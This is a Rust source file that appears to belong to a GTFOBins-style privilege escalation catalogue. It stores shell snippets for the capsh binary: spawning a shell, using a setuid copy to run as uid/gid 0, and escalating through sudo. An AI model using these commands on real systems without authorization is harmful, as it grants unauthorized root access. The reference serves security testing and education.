
pub static BIN_NAME: &'static str = "capsh";
pub static SH_CODE: &'static str = r#"
    
    capsh --
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which capsh) .

    ./capsh --gid=0 --uid=0 --
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo capsh --
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
